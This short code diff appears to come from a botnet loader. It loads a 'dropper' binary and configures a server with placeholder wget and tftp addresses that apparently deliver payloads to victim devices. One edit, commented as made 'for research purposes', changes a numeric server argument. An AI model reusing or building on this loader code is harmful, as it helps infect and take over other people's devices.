@@ -48,9 +48,10 @@ int main(int argc, char **args)
         printf("Failed to load bins/dlr.* as dropper\n");
         return 1;
     }
-
+    //chuckixia
+    //edited the number of threads that are created for research purposes
     /*                                                                                   wget address           tftp address */
-    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "100.200.100.100", 80, "100.200.100.100")) == NULL)
+    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs,  64, "100.200.100.100", 80, "100.200.100.100")) == NULL)
     {
         printf("Failed to initialize server. Aborting\n");
         return 1;
